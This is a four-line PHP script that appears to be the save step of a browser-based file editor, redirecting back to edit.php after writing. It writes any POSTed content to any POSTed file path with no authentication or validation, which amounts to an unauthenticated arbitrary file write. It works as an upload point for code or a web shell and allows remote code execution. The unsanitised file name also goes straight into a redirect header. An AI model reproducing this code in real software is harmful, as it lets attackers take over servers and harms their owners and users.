<?php
file_put_contents($_POST["file"],$_POST["code"]);
header("Location: edit.php?imi=" . $_POST["file"] . "&er=1");
?>